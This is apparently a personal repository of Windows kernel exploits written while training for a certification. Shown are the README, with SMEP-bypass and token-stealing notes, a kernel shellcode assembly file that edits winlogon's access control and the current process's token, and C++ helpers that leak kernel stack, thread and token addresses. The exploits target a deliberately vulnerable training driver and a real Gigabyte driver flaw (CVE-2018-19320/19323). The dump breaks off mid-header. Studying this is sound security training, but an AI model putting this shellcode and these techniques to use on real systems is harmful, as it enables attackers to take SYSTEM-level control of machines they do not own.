Project Path: arc_xct_windows-kernel-exploits_8ruyhwfw

Source Tree:

```txt
arc_xct_windows-kernel-exploits_8ruyhwfw
├── README.md
├── files
│   ├── HEVD.7z
│   └── gdrv.7z
├── windows-exploits
│   ├── ACLEditingBail.asm
│   ├── Common.cpp
│   ├── Common.h
│   ├── Exploit.cpp
│   ├── Exploits.h
│   ├── Gadgets.cpp
│   ├── Gadgets.h
│   ├── GigabyteDriverLI.cpp
│   ├── GigabyteDriverMI.cpp
│   ├── HevdArbitraryWriteMI.cpp
│   ├── HevdNullPointerMIWin7x64.cpp
│   ├── HevdPoolOverflowWin7x64.cpp
│   ├── HevdStackOverflowACLMI.cpp
│   ├── HevdStackOverflowGSMI.cpp
│   ├── HevdStackOverflowMI.cpp
│   ├── HevdStackOverflowRopMI.cpp
│   ├── HevdTypeConfusionMI.cpp
│   ├── HevdTypeConfusionMI2.cpp
│   ├── HevdUAFMI.cpp
│   ├── Template.cpp
│   ├── TokenStealingBail.asm
│   ├── TokenStealingWin7x64.asm
│   ├── windows-exploits.vcxproj
│   └── windows-exploits.vcxproj.filters
└── windows-exploits.sln

```

`README.md`:

```md
# Windows-Exploits

Some kernel exploits I used to learn about the topic, mainly for OSEE. These probably contain code snippets from other exploits - if I missed references/authors please send me a message and I'll add them.

## Kernel

### HEVD

Most exploits are vs. Win10 1909 x64 targetting https://github.com/hacksysteam/HackSysExtremeVulnerableDriver .

- StackOverflow (Medium Integrity)
- StackOverflow Data Only (ROP/PreviousMode Overwrite, Medium Intregity)
- StackOverflow with GS (Medium Integrity)
- TypeConfusion (Medium Integrity)
- TypeConfusion with StackPivot (Medium Integrity)
- User-After-Free (Medium Integrity)
- Pool Overflow Win7 x64 w ProcessBilled Overwrite (Medium Integrity)
- NullPtr Dereference Win7 x64 (Medium Integrity)

### Misc Drivers

All exploits are vs. Win10 1909 x64.

- CVE-2018-19320 (Gigabyte Driver, Medium Integrity)
- CVE-2018-19320 + CVE-2018-19323 (Gigabyte Driver, Low Integrity)

### Notes/Misc

- KUSER_SHARED_DATA, at offset 0x800 (0xFFFFF78000000800) in ntoskrnl.exe contains a writable code cave
- Ways to SYSTEM: Steal Token, Overwrite HAL Dispatch (or another ptr with a ptr to sc), ACL Editing
- Ways to get Page RW/RX: Flip bit like with U/S, WriteProcessMemory, VirtualProtect
- Bypass SMEP: Rop to 20th bit of CR4, Flip U/S, Write Code to Kernel Mem (using U/S trick to fix memory protections)
- KCFG  is only enforced when Hyper-V is enabled (it would prevent ptr overwrites to sc)
- Dangerous functions to look for in drivers: MmMapIoSpace, __readmsr/__writemsr,memmove
- Compile Shellcode: `nasm shellcode.asm -o shellcode.bin -f bin`, `radare2 -b 32 -c 'pc' ./shellcode.bin`

### Resources

- https://kristal-g.github.io/
- https://h0mbre.github.io
- https://blog.xpnsec.com/
- https://voidsec.com/
- https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/using-the-kernel-debugger-to-find-a-kernel-mode-memory-leak
- https://windows-internals.com/exploiting-a-simple-vulnerability-in-35-easy-steps-or-less/
- https://www.crowdstrike.com/blog/cve-2021-21551-learning-through-exploitation/
- https://www.sstic.org/media/SSTIC2020/SSTIC-actes/pool_overflow_exploitation_since_windows_10_19h1/SSTIC2020-Article-pool_overflow_exploitation_since_windows_10_19h1-bayet_fariello.pdf 
- https://github.com/synacktiv/Windows-kernel-SegmentHeap-Aligned-Chunk-Confusion
```

`windows-exploits.sln`:

```sln

Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio Version 17
VisualStudioVersion = 17.1.32210.238
MinimumVisualStudioVersion = 10.0.40219.1
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "windows-exploits", "windows-exploits\windows-exploits.vcxproj", "{7CDB586A-538B-4B90-A8C3-6575673E7DD5}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Debug|x64 = Debug|x64
		Debug|x86 = Debug|x86
		Release|x64 = Release|x64
		Release|x86 = Release|x86
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{7CDB586A-538B-4B90-A8C3-6575673E7DD5}.Debug|x64.ActiveCfg = Debug|x64
		{7CDB586A-538B-4B90-A8C3-6575673E7DD5}.Debug|x64.Build.0 = Debug|x64
		{7CDB586A-538B-4B90-A8C3-6575673E7DD5}.Debug|x86.ActiveCfg = Debug|Win32
		{7CDB586A-538B-4B90-A8C3-6575673E7DD5}.Debug|x86.Build.0 = Debug|Win32
		{7CDB586A-538B-4B90-A8C3-6575673E7DD5}.Release|x64.ActiveCfg = Release|x64
		{7CDB586A-538B-4B90-A8C3-6575673E7DD5}.Release|x64.Build.0 = Release|x64
		{7CDB586A-538B-4B90-A8C3-6575673E7DD5}.Release|x86.ActiveCfg = Release|Win32
		{7CDB586A-538B-4B90-A8C3-6575673E7DD5}.Release|x86.Build.0 = Release|Win32
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
	GlobalSection(ExtensibilityGlobals) = postSolution
		SolutionGuid = {B9936547-46B6-4F55-9E11-9B55136407E5}
	EndGlobalSection
EndGlobal

```

`windows-exploits/ACLEditingBail.asm`:

```asm
; https://github.com/MortenSchenk/ACL_Edit/blob/master/AclEdit.asm
[BITS 64]
  mov rax, gs:[188h]          ; KPROCESS
  mov rax, [rax+220h]         ; offset eprocess from kthread
  mov rcx, rax
  mov rax, [rax+448h]         ; offset to linked list ptr

  procloop:
  lea rbx, [rax-448h]         ; offset to linked list ptr (back to eprocess)
  mov rax, [rax]
  add rbx, 5a8h               ; offset to ImageFileName
  cmp dword [rbx], 6c6e6977h
  jne procloop

  sub rbx, 5b0h               ; offset of EPROCESS of winlogon (back from ImageFileName)
  mov rax, [rbx]
  and rax, 0FFFFFFFFFFFFFFF0h ; zero out last nibble
  add rax, 48h                
  mov byte [rax], 0fh         ; change to 0b/0f 
  add rcx, 4b8h               ; offset to Token from EPROCESS
  mov rax, [rcx]
  and rax, 0FFFFFFFFFFFFFFF0h
  add rax, 0d4h
  mov byte [rax], 0
  ; ret

  bail:
  mov rax, [gs:0x188]       ; _KPCR.Prcb.CurrentThread
  mov cx, [rax + 0x1e4]     ; KTHREAD.KernelApcDisable
  inc cx
  mov [rax + 0x1e4], cx
  mov rdx, [rax + 0x90]       ; ETHREAD.TrapFrame
  mov rcx, [rdx + 0x168]      ; ETHREAD.TrapFrame.Rip
  mov r11, [rdx + 0x178]      ; ETHREAD.TrapFrame.EFlags
  mov rsp, [rdx + 0x180]      ; ETHREAD.TrapFrame.Rsp
  mov rbp, [rdx + 0x158]      ; ETHREAD.TrapFrame.Rbp
  xor eax, eax          ; return STATUS_SUCCESS to NtDeviceIoControlFile 
  swapgs
  o64 sysret

```

`windows-exploits/Common.cpp`:

```cpp
#include "Common.h"

// getPteAddress
uintptr_t getPteAddress(PVOID addr, PVOID base)
{
	uintptr_t address = (uintptr_t)addr;
	address = address >> 9;
	address &= 0x7FFFFFFFF8;
	address += (intptr_t)base;
	return address;
}

// sprayTLBCache
void sprayTLBCache() {
	void* arr[CACHE_SPRAY_SIZE * 20];
	char arr2[CACHE_SPRAY_SIZE * 20];
	int idx = 0;

	printf("[*] Invalidating  TLB cache\n");
	for (int c = 0; c < 20; c++) {
		DWORD_PTR res = SetThreadAffinityMask(GetCurrentThread(), 1 << c);
		if (!res)
			continue;
		printf("  Core: %d\n", c);
		for (int i = 0; i < CACHE_SPRAY_SIZE; i++) {
			idx = c * CACHE_SPRAY_SIZE + i;
			arr[idx] = malloc(4096);
			*(char*)arr[idx] = 1;
			arr2[idx] = *(char*)arr[idx];
			*(char*)arr[idx] = arr2[idx] + 2;
		}
	}
	printf("[*] Finished invalidating TLB cache\n");
	_mm_sfence();
}


// getBaseAddr
ULONGLONG getBaseAddr(LPCWSTR drvname)
{
	LPVOID drivers[1024];
	DWORD cbNeeded;
	int nDrivers, i = 0;

	if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded < sizeof(drivers))
	{
		WCHAR szDrivers[1024];
		nDrivers = cbNeeded / sizeof(drivers[0]);
		for (i = 0; i < nDrivers; i++)
		{
			if (GetDeviceDriverBaseName(drivers[i], szDrivers, sizeof(szDrivers) / sizeof(szDrivers[0])))
			{
				if (wcscmp(szDrivers, drvname) == 0)
				{
					return (ULONGLONG)drivers[i];
				}
			}
		}
	}
	return 0;
}


// getDriverDataSection
DWORD getDriverDataSection(const char* path) {
	HANDLE hHevdLocalBase = LoadLibraryExA(path, NULL, DONT_RESOLVE_DLL_REFERENCES);
	if (!hHevdLocalBase) {
		printf("[-] Failed to load driver: %d\n", GetLastError());
		exit(-1);
	}
	PIMAGE_NT_HEADERS imageHeader = (PIMAGE_NT_HEADERS)((ULONG_PTR)hHevdLocalBase + ((PIMAGE_DOS_HEADER)hHevdLocalBase)->e_lfanew);
	ULONG_PTR sectionLocation = (ULONG_PTR)IMAGE_FIRST_SECTION(imageHeader);
	DWORD dataSectionOffset = 0;

	for (int i = 0; i < imageHeader->FileHeader.NumberOfSections; i++) {
		PIMAGE_SECTION_HEADER hevdSection = (PIMAGE_SECTION_HEADER)sectionLocation;
		const char* name = (const char*)hevdSection->Name;
		if (strcmp(name, ".data") == 0) {
			dataSectionOffset = hevdSection->VirtualAddress;
		}
		sectionLocation += sizeof(IMAGE_SECTION_HEADER);
	}
	if (dataSectionOffset == 0) {
		printf("[-] Failed locating the .data section\n");
		exit(-1);
	}
	printf("[+] Offset of .data section is: %d\n", dataSectionOffset);
	return dataSectionOffset;
}


// leakStackBase
StackInfo leakStackBase(const char* path) {
	StackInfo stackInfo{};
	HMODULE ntdll = GetModuleHandleA("ntdll");
	_NtQuerySystemInformation query = (_NtQuerySystemInformation)GetProcAddress(ntdll, "NtQuerySystemInformation");
	if (query == NULL) {
		printf("[-] GetProcAddress(NtQuerySystemInformation) failed.\n");
		exit(-1);
	}
	ULONG len = 2000;
	NTSTATUS status = NULL;
	PSYSTEM_EXTENDED_PROCESS_INFORMATION pProcessInfo = NULL;
	do {
		len *= 2;
		pProcessInfo = (PSYSTEM_EXTENDED_PROCESS_INFORMATION)GlobalAlloc(GMEM_ZEROINIT, len);
		status = query(SystemExtendedProcessInformation, pProcessInfo, len, &len);
	} while (status == STATUS_INFO_LENGTH_MISMATCH);
	if (status != STATUS_SUCCESS) {
		printf("[-] NtQuerySystemInformation failed with error code 0x%X\n", status);
		exit(-1);
	}

	UNICODE_STRING myProc = { 0 };
	my_RtlInitUnicodeString myRtlInitUnicodeString = (my_RtlInitUnicodeString)GetProcAddress(ntdll, "RtlInitUnicodeString");
	my_RtlEqualUnicodeString myRtlEqualUnicodeString = (my_RtlEqualUnicodeString)GetProcAddress(ntdll, "RtlEqualUnicodeString");
	if (myRtlInitUnicodeString == NULL || myRtlEqualUnicodeString == NULL) {
		printf("[-] Failed initializing unicode functions\n");
		exit(-1);
	}

	myRtlInitUnicodeString(&myProc, L"Exploit.exe");
	printf("[+] Iterating processes threads, looking for kernel stack address\n");
	PVOID stackLimit = NULL;
	while (pProcessInfo != NULL) {
		if (myRtlEqualUnicodeString(&(pProcessInfo->ImageName), &myProc, TRUE)) {
			printf("  Process: %wZ\n", pProcessInfo->ImageName);
			for (unsigned int i = 0; i < pProcessInfo->NumberOfThreads; i++) {
				PVOID stackBase = pProcessInfo->Threads[i].StackBase;
				stackLimit = pProcessInfo->Threads[i].StackLimit;
				stackInfo.Base = stackBase;
				stackInfo.Limit = stackLimit;
				return stackInfo;
			}
		}

		if (!pProcessInfo->NextEntryOffset) {
			pProcessInfo = NULL;
		}
		else {
			pProcessInfo = (PSYSTEM_EXTENDED_PROCESS_INFORMATION)((ULONG_PTR)pProcessInfo + pProcessInfo->NextEntryOffset);
		}
	}
	return stackInfo;
}


// getSystemEProcess
QWORD getSystemEProcess() {
	ULONG returnLenght = 0;
	fNtQuerySystemInformation NtQuerySystemInformation = (fNtQuerySystemInformation)GetProcAddress(GetModuleHandle(L"ntdll"), "NtQuerySystemInformation");
	PSYSTEM_HANDLE_INFORMATION handleTableInformation = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, SystemHandleInformationSize);
	NtQuerySystemInformation(SystemHandleInformation, handleTableInformation, SystemHandleInformationSize, &returnLenght);
	SYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo = (SYSTEM_HANDLE_TABLE_ENTRY_INFO)handleTableInformation->Handles[0];
	return (QWORD)handleInfo.Object;
}


// GetServiceHandle ...
HRESULT GetServiceHandle(_In_ LPCWSTR ServiceName, _Out_ PHANDLE ProcessHandle) {
	SC_HANDLE hScm, hRpc;
	BOOL bRes;
	SERVICE_STATUS_PROCESS procInfo;
	HRESULT hResult;
	DWORD dwBytes;
	HANDLE hProc;
	hScm = NULL;
	hRpc = NULL;

	// Connect to the SCM
	hScm = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
	if (hScm == NULL)
	{
		hResult = HRESULT_FROM_WIN32(GetLastError());
		printf("[-] OpenScManager failed with error %d\n", hResult);
		exit(-1);
	}

	// Open the service
	hRpc = OpenService(hScm, ServiceName, SERVICE_QUERY_STATUS);
	if (hRpc == NULL)
	{
		hResult = HRESULT_FROM_WIN32(GetLastError());
		printf("[-] OpenService failed with error %d\n", hResult);
		exit(-1);
	}

	// Query the process information
	bRes = QueryServiceStatusEx(hRpc,
		SC_STATUS_PROCESS_INFO,
		(LPBYTE)&procInfo,
		sizeof(procInfo),
		&dwBytes);
	if (bRes == FALSE)
	{
		hResult = HRESULT_FROM_WIN32(GetLastError());
		printf("[-] QueryServiceStatusEx failed with error %d\n", hResult);
		exit(-1);
	}

	// Open a handle for all access to the PID
	hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, procInfo.dwProcessId);
	if (hProc == NULL)
	{
		hResult = HRESULT_FROM_WIN32(GetLastError());
		printf("[-] OpenProcess failed with error %d\n", hResult);
		exit(-1);
	}

	*ProcessHandle = hProc;
	hResult = ERROR_SUCCESS;
	if (hRpc != NULL)
	{
		CloseServiceHandle(hRpc);
	}
	if (hScm != NULL)
	{
		CloseServiceHandle(hScm);
	}
	return hResult;
}


HRESULT GetTokenObjectIndex(_Out_ PULONG TokenIndex){
	HANDLE hToken;
	BOOL bRes;
	NTSTATUS status;
	struct{
		OBJECT_TYPE_INFORMATION TypeInfo;
		WCHAR TypeNameBuffer[sizeof("Token")];
	} typeInfoWithName;

	// Open the current process token
	bRes = OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken);
	if (bRes == FALSE) {
		return HRESULT_FROM_WIN32(GetLastError());
	}

	HMODULE ntdll = GetModuleHandleA("ntdll");
	_NtQueryObject queryObj = (_NtQueryObject)GetProcAddress(ntdll, "NtQueryObject");

	status = queryObj(hToken, ObjectTypeInformation, &typeInfoWithName, sizeof(typeInfoWithName), NULL);
	CloseHandle(hToken);
	if (!NT_SUCCESS(status))
	{
		return HRESULT_FROM_NT(status);
	}

	*TokenIndex = typeInfoWithName.TypeInfo.TypeIndex;
	return ERROR_SUCCESS;
}


HRESULT GetProcessTokenAddress(_In_ HANDLE tokenHandle, _Out_ PVOID* HandleAddress) {
	NTSTATUS status;

	SYSTEM_HANDLE_INFORMATION localInfo;
	PSYSTEM_HANDLE_INFORMATION handleInfo = &localInfo;

	ULONG bytes;
	ULONG tokenIndex;
	ULONG i;
	HRESULT hResult;

	*HandleAddress = 0;
	// Get the Object Type Index for Token Objects so we can recognize them
	hResult = GetTokenObjectIndex(&tokenIndex);
	if (FAILED(hResult))
	{
		printf("Failed to get token\n");
		exit(-1);
	}

	// Check how big the handle table is
	HMODULE ntdll = GetModuleHandleA("ntdll");
	_NtQuerySystemInformation queryInfo = (_NtQuerySystemInformation)GetProcAddress(ntdll, "NtQuerySystemInformation");

	status = queryInfo(SystemHandleInformation,	handleInfo, sizeof(*handleInfo), &bytes);
	if (NT_SUCCESS(status))
	{
		printf("[!] NtQuerySystemInformation failed: 0x%x\n", status);
		hResult = ERROR_UNIDENTIFIED_ERROR;
		exit(-1);
	}

	// Add space for 100 more handles and try again
	bytes += 100 * sizeof(*handleInfo);
	handleInfo = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, bytes);
	status = queryInfo(SystemHandleInformation,	handleInfo, bytes, &bytes);
	if (!NT_SUCCESS(status) || !handleInfo)
	{
		hResult = HRESULT_FROM_NT(status);
		printf("[!] NtQuerySystemInformation #2 failed: 0x%x\n", status);
		exit(-1);
	}

	// Enumerate each one
	for (i = 0; i < handleInfo->NumberOfHandles; i++)
	{
		// Check if it's the token of this process
		if ((handleInfo->Handles[i].ObjectTypeIndex == tokenIndex) &&
			(handleInfo->Handles[i].UniqueProcessId == GetCurrentProcessId()) &&
			((HANDLE)handleInfo->Handles[i].HandleValue == tokenHandle))
		{
			printf("[*] Found current process token\n");
			*HandleAddress = handleInfo->Handles[i].Object;
		}
	}
	// Free the handle list if we had one
	if (handleInfo != &localInfo)
	{
		HeapFree(GetProcessHeap(), 0, handleInfo);
	}
	return hResult;
}

PVOID GetkThread()
{
	NTSTATUS nt_status;
	HANDLE hThread = OpenThread(THREAD_QUERY_INFORMATION, FALSE, GetCurrentThreadId());
	if (!hThread)
	{
		printf("[!] Error while getting the thread ID: %d\n", GetLastError());
		exit(1);
	}

	_NtQuerySystemInformation pNtQuerySystemInformation = (_NtQuerySystemInformation)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
	if (!pNtQuerySystemInformation)
	{
		printf("[!] Error while resolving NtQuerySystemInformation: %d\n", GetLastError());
		exit(1);
	}

	ULONG system_handle_info_size = 4096;
	PSYSTEM_HANDLE_INFORMATION system_handle_info = (PSYSTEM_HANDLE_INFORMATION)malloc(system_handle_info_size);
	memset(system_handle_info, 0x00, sizeof(SYSTEM_HANDLE_INFORMATION));

	while ((nt_status = pNtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemHandleInformation, system_handle_info, system_handle_info_size, NULL)) == STATUS_INFO_LENGTH_MISMATCH)
	{
		system_handle_info = (PSYSTEM_HANDLE_INFORMATION)realloc(system_handle_info, system_handle_info_size *= 10);
		if (system_handle_info == NULL)
		{
			printf("[!] Error while allocating memory for NtQuerySystemInformation: %d\n", GetLastError());
			exit(1);
		}
	}
	if (nt_status != 0x0)
	{
		printf("[!] Error while calling NtQuerySystemInformation to obtain the SystemHandleInformation.\n");
		exit(1);
	}

	int z = 0;
	for (unsigned int i = 0; i < system_handle_info->NumberOfHandles; i++)
	{
		if ((HANDLE)system_handle_info->Handles[i].HandleValue == hThread)
		{
			if (system_handle_info->Handles[i].ObjectTypeIndex == ObjectThreadType)
			{
				z++;
			}
		}
	}

	int array_size = z - 1;
	PVOID* kThread_array = new PVOID[array_size];
	z = 0;
	for (unsigned int i = 0; i < system_handle_info->NumberOfHandles; i++)
	{
		if ((HANDLE)system_handle_info->Handles[i].HandleValue == hThread)
		{
			if (system_handle_info->Handles[i].ObjectTypeIndex == ObjectThreadType)
			{
				kThread_array[z] = system_handle_info->Handles[i].Object;
				z++;
			}
		}
	}

	printf("[+] KTHREAD address: %p\n", kThread_array[array_size]);
	return kThread_array[array_size];
}


DWORD FindProcessId(const std::wstring& processName)
{
	PROCESSENTRY32 processInfo;
	processInfo.dwSize = sizeof(processInfo);

	HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (processesSnapshot == INVALID_HANDLE_VALUE)
		return 0;

	Process32First(processesSnapshot, &processInfo);
	if (!processName.compare(processInfo.szExeFile))
	{
		CloseHandle(processesSnapshot);
		return processInfo.th32ProcessID;
	}

	while (Process32Next(processesSnapshot, &processInfo))
	{
		if (!processName.compare(processInfo.szExeFile))
		{
			CloseHandle(processesSnapshot);
			return processInfo.th32ProcessID;
		}
	}

	CloseHandle(processesSnapshot);
	return 0;
}
```

`windows-exploits/Common.h`:

```h
#pragma once

#include <windows.h>
#include <winioctl.h>
#include <stdio.h>
#include <iostream>
#include <ntstatus.h>
#include <winternl.h>
#include <Psapi.h>
#include <string.h>
#include <stddef.h>
#include <map>
#include <vector>
#include <tlhelp32.h>


typedef ULONGLONG QWORD;
typedef QWORD* PQWORD;

// other
#define CACHE_SPRAY_SIZE 3000
#define IOCTL(Function) CTL_CODE(FILE_DEVICE_UNKNOWN, Function, METHOD_NEITHER, FILE_ANY_ACCESS)
#define SystemExtendedProcessInformation 57
#define SystemHandleInformation 0x10
#define SystemHandleInformationSize 1024 * 1024 * 2
#define SE_DEBUG_PRIVILEGE (20L)
#define ObjectThreadType 0x08

typedef NTSTATUS(WINAPI* _NtQueryObject)(
    HANDLE Handle,
    int ObjectInformationClass,
    PVOID ObjectInformation,
    ULONG ObjectInformationLength,
    PULONG ReturnLength
);

typedef NTSTATUS(WINAPI* _NtQuerySystemInformation)(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

typedef NTSTATUS(WINAPI* NtQueryIntervalProfile_t)(
    IN ULONG ProfileSource, 
    OUT PULONG Interval
);

typedef VOID(NTAPI* my_RtlInitUnicodeString) (
    PUNICODE_STRING DestinationString,
    PCWSTR SourceString
    );

typedef BOOLEAN(WINAPI* my_RtlEqualUnicodeString)(
    PCUNICODE_STRING String1,
    PCUNICODE_STRING String2,
    BOOLEAN          CaseInSensitive
    );


typedef NTSTATUS(NTAPI* my_NtCreateSymbolicLinkObject)(
    OUT PHANDLE             pHandle,
    IN ACCESS_MASK          DesiredAccess,
    IN POBJECT_ATTRIBUTES   ObjectAttributes,
    IN PUNICODE_STRING      DestinationName
    );


typedef NTSTATUS(NTAPI* my_NtCreateDirectoryObject)(
    OUT PHANDLE             DirectoryHandle,
    IN ACCESS_MASK          DesiredAccess,
    IN POBJECT_ATTRIBUTES   ObjectAttributes
    );


typedef struct _VM_COUNTERS
{
    SIZE_T		   PeakVirtualSize;
    SIZE_T         PageFaultCount;
    SIZE_T         PeakWorkingSetSize;
    SIZE_T         WorkingSetSize;
    SIZE_T         QuotaPeakPagedPoolUsage;
    SIZE_T         QuotaPagedPoolUsage;
    SIZE_T         QuotaPeakNonPagedPoolUsage;
    SIZE_T         QuotaNonPagedPoolUsage;
    SIZE_T         PagefileUsage;
    SIZE_T         PeakPagefileUsage;
    SIZE_T         VirtualSize;		
} VM_COUNTERS;

typedef enum _KWAIT_REASON
{
    Executive = 0,
    FreePage = 1,
    PageIn = 2,
    PoolAllocation = 3,
    DelayExecution = 4,
    Suspended = 5,
    UserRequest = 6,
    WrExecutive = 7,
    WrFreePage = 8,
    WrPageIn = 9,
    WrPoolAllocation = 10,
    WrDelayExecution = 11,
    WrSuspended = 12,
    WrUserRequest = 13,
    WrEventPair = 14,
    WrQueue = 15,
    WrLpcReceive = 16,
    WrLpcReply = 17,
    WrVirtualMemory = 18,
    WrPageOut = 19,
    WrRendezvous = 20,
    Spare2 = 21,
    Spare3 = 22,
    Spare4 = 23,
    Spare5 = 24,
    WrCalloutStack = 25,
    WrKernel = 26,
    WrResource = 27,
    WrPushLock = 28,
    WrMutex = 29,
    WrQuantumEnd = 30,
    WrDispatchInt = 31,
    WrPreempted = 32,
    WrYieldExecution = 33,
    WrFastMutex = 34,
    WrGuardedMutex = 35,
    WrRundown = 36,
    MaximumWaitReason = 37
} KWAIT_REASON;

typedef struct _SYSTEM_EXTENDED_THREAD_INFORMATION
{
    SYSTEM_THREAD_INFORMATION ThreadInfo;
    PVOID StackBase;
    PVOID StackLimit;
    PVOID Win32StartAddress;
    PVOID TebAddress; /* This is only filled in on Vista and above */
    ULONG Reserved1;
    ULONG Reserved2;
    ULONG Reserved3;
} SYSTEM_EXTENDED_THREAD_INFORMATION, * PSYSTEM_EXTENDED_THREAD_INFORMATION;

typedef struct _SYSTEM_EXTENDED_PROCESS_INFORMATION
{
    ULONG NextEntryOffset;
    ULONG NumberOfThreads;
    LARGE_INTEGER SpareLi1;
    LARGE_INTEGER SpareLi2;
    LARGE_INTEGER SpareLi3;
    LARGE_INTEGER CreateTime;
    LARGE_INTEGER UserTime;
    LARGE_INTEGER KernelTime;
    UNICODE_STRING ImageName;
    KPRIORITY BasePriority;
    ULONG ProcessId;
    ULONG InheritedFromUniqueProcessId;
    ULONG HandleCount;
    ULONG SessionId;
    PVOID PageDirectoryBase;
    VM_COUNTERS VirtualMemoryCounters;
    SIZE_T PrivatePageCount;
    IO_COUNTERS IoCounters;
    SYSTEM_EXTENDED_THREAD_INFORMATION Threads[1];
} SYSTEM_EXTENDED_PROCESS_INFORMATION, * PSYSTEM_EXTENDED_PROCESS_INFORMATION;


typedef struct StackInfo {
    PVOID Base;
    PVOID Limit;
} StackInfo;


using fNtQuerySystemInformation = NTSTATUS(WINAPI*)(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
    );

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO
{
    USHORT UniqueProcessId;
    USHORT CreatorBackTraceIndex;
    UCHAR ObjectTypeIndex;
    UCHAR HandleAttributes;
    USHORT HandleValue;
    PVOID Object;
    ULONG GrantedAccess;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO;

typedef struct _SYSTEM_HANDLE_INFORMATION
{
    ULONG NumberOfHandles;
    SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];
} SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;

typedef NTSTATUS(NTAPI* _NtQueryIntervalProfile)(
    DWORD ProfileSource,
    PULONG Interval
);

typedef NTSTATUS(WINAPI* _NtWriteVirtualMemory)(
    _In_ HANDLE ProcessHandle,
    _In_ PVOID BaseAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytesToWrite,
    _Out_opt_ PULONG NumberOfBytesWritten
    );

typedef NTSTATUS(*WINAPI ZwAllocateVirtualMemory)(
    _In_    HANDLE    ProcessHandle,
    _Inout_ PVOID* BaseAddress,
    _In_    ULONG_PTR ZeroBits,
    _Inout_ PSIZE_T   RegionSize,
    _In_    ULONG     AllocationType,
    _In_    ULONG     Protect
);


typedef struct _SEP_TOKEN_PRIVILEGES
{
    /* 0x0000 */ unsigned __int64 Present;
    /* 0x0008 */ unsigned __int64 Enabled;
    /* 0x0010 */ unsigned __int64 EnabledByDefault;
} SEP_TOKEN_PRIVILEGES, * PSEP_TOKEN_PRIVILEGES; /* size: 0x0018 */

typedef struct _SEP_AUDIT_POLICY
{
    /* 0x0000 */ struct _TOKEN_AUDIT_POLICY AdtTokenPolicy;
    /* 0x001e */ unsigned char PolicySetStatus;
} SEP_AUDIT_POLICY, * PSEP_AUDIT_POLICY; /* size: 0x001f */

typedef struct _TOKEN
{
    /* 0x0000 */ struct _TOKEN_SOURCE TokenSource;
    /* 0x0010 */ struct _LUID TokenId;
    /* 0x0018 */ struct _LUID AuthenticationId;
    /* 0x0020 */ struct _LUID ParentTokenId;
    /* 0x0028 */ union _LARGE_INTEGER ExpirationTime;
    /* 0x0030 */ struct _ERESOURCE* TokenLock;
    /* 0x0038 */ struct _LUID ModifiedId;
    /* 0x0040 */ struct _SEP_TOKEN_PRIVILEGES Privileges;
    /* 0x0058 */ struct _SEP_AUDIT_POLICY AuditPolicy;
    /* 0x0078 */ unsigned long SessionId;
    /* 0x007c */ unsigned long UserAndGroupCount;
    /* 0x0080 */ unsigned long RestrictedSidCount;
    /* 0x0084 */ unsigned long VariableLength;
    /* 0x0088 */ unsigned long DynamicCharged;
    /* 0x008c */ unsigned long DynamicAvailable;
    /* 0x0090 */ unsigned long DefaultOwnerIndex;
    /* 0x0098 */ struct SID_AND_ATTRIBUTES* UserAndGroups;
    /* 0x00a0 */ struct SID_AND_ATTRIBUTES* RestrictedSids;
    /* 0x00a8 */ void* PrimaryGroup;
    /* 0x00b0 */ unsigned long* DynamicPart;
    /* 0x00b8 */ struct _ACL* DefaultDacl;
    /* 0x00c0 */ enum _TOKEN_TYPE TokenType;
    /* 0x00c4 */ enum _SECURITY_IMPERSONATION_LEVEL ImpersonationLevel;
    /* 0x00c8 */ unsigned long TokenFlags;
    /* 0x00cc */ unsigned char TokenInUse;
    /* 0x00d0 */ unsigned long IntegrityLevelIndex;
    /* 0x00d4 */ unsigned long MandatoryPolicy;
    /* 0x00d8 */ struct _SEP_LOGON_SESSION_REFERENCES* LogonSession;
    /* 0x00e0 */ struct _LUID OriginatingLogonSession;
    /* 0x00e8 */ struct _SID_AND_ATTRIBUTES_HASH SidHash;
    /* 0x01f8 */ struct _SID_AND_ATTRIBUTES_HASH RestrictedSidHash;
    /* 0x0308 */ struct _AUTHZBASEP_SECURITY_ATTRIBUTES_INFORMATION* pSecurityAttributes;
    /* 0x0310 */ void* Package;
    /* 0x0318 */ struct _SID_AND_ATTRIBUTES* Capabilities;
    /* 0x0320 */ unsigned long CapabilityCount;
    /* 0x0328 */ struct _SID_AND_ATTRIBUTES_HASH CapabilitiesHash;
    /* 0x0438 */ struct _SEP_LOWBOX_NUMBER_ENTRY* LowboxNumberEntry;
    /* 0x0440 */ struct _SEP_CACHED_HANDLES_ENTRY* LowboxHandlesEntry;
    /* 0x0448 */ struct _AUTHZBASEP_CLAIM_ATTRIBUTES_COLLECTION* pClaimAttributes;
    /* 0x0450 */ void* TrustLevelSid;
    /* 0x0458 */ struct _TOKEN* TrustLinkedToken;
    /* 0x0460 */ void* IntegrityLevelSidValue;
    /* 0x0468 */ struct _SEP_SID_VALUES_BLOCK* TokenSidValues;
